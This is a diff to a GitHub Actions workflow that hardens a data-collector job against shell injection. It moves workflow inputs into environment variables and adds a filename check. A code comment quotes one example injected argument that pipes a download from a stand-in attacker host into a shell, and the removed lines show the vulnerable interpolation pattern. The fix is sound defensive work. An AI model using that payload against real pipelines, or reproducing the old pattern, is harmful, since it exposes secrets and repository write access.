@@ -51,28 +51,42 @@ jobs:
           python-version: '3.13'
       - name: Install deps
         run: pip install -r requirements.txt
+      # W-007c/G18: workflow inputs reach the shell ONLY through env vars, never `${{ }}`
+      # interpolation into the script body. This job holds R2_SECRET_ACCESS_KEY and a
+      # contents:write token, so raw interpolation turned "may dispatch the backfill" into
+      # arbitrary shell with archive-write and repo-push capability (args like
+      # `--all; curl attacker/x | sh`). Env expansion word-splits — which is what `$PBJ_ARGS`
+      # wants — but cannot inject shell syntax.
       - name: Collect (${{ inputs.entry }} ${{ inputs.target }})
+        env:
+          ENTRY: ${{ inputs.entry }}
+          TARGET: ${{ inputs.target }}
+          PBJ_ARGS: ${{ inputs.args }}
         run: |
-          if [ "${{ inputs.entry }}" = "ats" ]; then
+          if [ "$ENTRY" = "ats" ]; then
             python -m collectors.ats_boards
-          elif [ "${{ inputs.entry }}" = "warn" ]; then
+          elif [ "$ENTRY" = "warn" ]; then
             python -m collectors.warn
-          elif [ "${{ inputs.entry }}" = "pbj" ]; then
-            python -m collectors.cms_pbj ${{ inputs.args }}
+          elif [ "$ENTRY" = "pbj" ]; then
+            python -m collectors.cms_pbj $PBJ_ARGS
           else
-            python -m collectors.run "${{ inputs.target }}"
+            python -m collectors.run "$TARGET"
           fi
       - name: Persist collector state (W-002b)
         if: always()            # commit state even if the collector exited nonzero — the record
-        run: |                  # carries the drift/pause flags the watcher needs.
+        env:                    # carries the drift/pause flags the watcher needs.
+          ENTRY: ${{ inputs.entry }}
+          TARGET: ${{ inputs.target }}
+        run: |
           # Every fleet entry MUST map to its state filename here. Falling through to an empty
           # `target` would write ops/state/health/.json and the quarantine/pause record would never
           # reach main — the W-002b failure the watchers cannot see through.
-          if [ "${{ inputs.entry }}" = "ats" ]; then name="ats-boards";
-          elif [ "${{ inputs.entry }}" = "warn" ]; then name="warn";
-          elif [ "${{ inputs.entry }}" = "pbj" ]; then name="cms-pbj";
-          else name="${{ inputs.target }}"; fi
-          if [ -z "${name}" ]; then echo "::error::no state filename for entry='${{ inputs.entry }}'"; exit 1; fi
+          if [ "$ENTRY" = "ats" ]; then name="ats-boards";
+          elif [ "$ENTRY" = "warn" ]; then name="warn";
+          elif [ "$ENTRY" = "pbj" ]; then name="cms-pbj";
+          else name="$TARGET"; fi
+          case "${name}" in *[!a-z0-9-]*) echo "::error::refusing state filename '${name}'"; exit 1;; esac
+          if [ -z "${name}" ]; then echo "::error::no state filename for entry='${ENTRY}'"; exit 1; fi
           f="ops/state/health/${name}.json"
           action=$(jq -r ".collectors[\"${name}\"].last_action // \"update\"" "$f" 2>/dev/null || echo update)
           # Dedupe firing: the committed baseline (last_hash) is unchanged, so a timestamp-only diff
